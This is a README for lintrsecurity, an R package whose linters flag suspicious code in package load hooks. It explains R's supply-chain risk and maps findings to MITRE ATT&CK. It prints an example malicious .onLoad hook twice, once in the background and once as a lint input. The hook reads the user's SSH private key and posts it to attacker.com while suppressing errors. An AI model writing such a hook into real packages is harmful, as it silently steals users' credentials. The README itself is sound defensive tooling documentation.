# lintrsecurity

lintrsecurity provides security-focused [linters](https://en.wikipedia.org/wiki/Lint_(software)) for use with the [lintr](https://lintr.r-lib.org/) package. The package is intended to support secure R package development. Importantly, because lintr respects `# nolint` exclusions, these linters should only be used on code you trust (to remove insecure patterns before sharing). For an alternative implementation that ignores `# nolint` exclusions, see [pkgaudit](https://github.com/tylerjssmith/lintrsecurity).

## Background

### R is an attack surface

R packages are the primary mechanism for sharing R code. When you run `install.packages()` or `library()`, R executes code from the package automatically -- code you may never have read. This creates an attack surface: a malicious or compromised package can run arbitrary code on your system the moment you install or load it, without any action beyond your normal R workflow.

This is not a theoretical risk. The same attack pattern has been documented repeatedly in other package ecosystems. In 2018, a malicious contributor to the widely-used JavaScript package `event-stream` on npm introduced code that stole cryptocurrency wallets from a specific target. In 2024, the Python package `ultralytics` on PyPI was compromised to distribute a cryptominer to its users. CRAN has received little systematic security scrutiny compared to these ecosystems, despite R's deep penetration in environments processing sensitive data: clinical trial analysis, government statistics, financial risk modeling, and academic research.

The initial release of lintrsecurity focuses on **lifecycle hooks**, which are functions that R calls automatically during package loading. `.onLoad()` runs when a package's namespace is loaded, and `.onAttach()` runs when the package is attached to the search path -- both triggered by a call to `library()`. Any code inside these functions runs with the privileges of the user running R, before the user has any opportunity to review it.

A minimal example of what a malicious `.onLoad` hook might look like is:

``` r
.onLoad <- function(libname, pkgname) {
  tryCatch({
    key <- readLines("~/.ssh/id_rsa")
    httr::POST("https://attacker.com/collect",
               body = list(key = paste(key, collapse = "\n")))
  }, error = function(e) invisible(NULL))
}
```

This code reads the user's SSH private key and sends it to an external server whenever the package is loaded. The `tryCatch()` wrapper suppresses any errors, so the package loads normally and the user sees nothing unusual.

### What lintrsecurity does

lintrsecurity provides linters for use with the [lintr](https://lintr.r-lib.org/) package to detect patterns in R source code associated with these attack vectors. It is designed for R developers who want to ensure their own code does not contain insecure patterns before sharing it. 

Findings are mapped to the [MITRE ATT&CK](https://attack.mitre.org/) framework, the standard vocabulary for describing adversarial behavior, to help security teams integrate lintrsecurity findings into their existing threat analysis workflows.

### What lintrsecurity does not do

These linters should only be used on code you trust. lintr was built to enforce code style guides, not to ensure security. It therefore will ignore code marked with `# nolint` comments. This is wholly appropriate for a style code but provides an obvious evasion technique for malicious actors. To scan code with the same rules while ignoring `# nolint` comments, see see [pkgaudit](https://github.com/tylerjssmith/lintrsecurity).

Moreover, static analysis cannot detect all malicious code -- a determined attacker can obfuscate dangerous patterns beyond what any source-level tool can reliably identify. lintrsecurity or pkgaudit is just layer of defense, not a complete solution. Its value is catching naive attacks, surfacing patterns that warrant manual review.

## Installation

You can install the development version of `lintrsecurity` as follows:

``` r
pak::pak('tylerjssmith/lintrsecurity')
```

## Usage

The security-focused linters are used in `lintr::lint()` calls. See the lintr [vignette](https://lintr.r-lib.org/articles/lintr.html) for an overview. A script may be scanned as follows:

``` r
library(lintr)
library(lintrsecurity)

malicious <- '
.onLoad <- function(libname, pkgname) {
  tryCatch({
    key <- readLines("~/.ssh/id_rsa")
    httr::POST("https://attacker.com/collect",
               body = list(key = paste(key, collapse = "\n")))
  }, error = function(e) invisible(NULL))
}
'

lintr::lint(text = malicious, linters = lintrsecurity::lintrsecurity_linters())
```




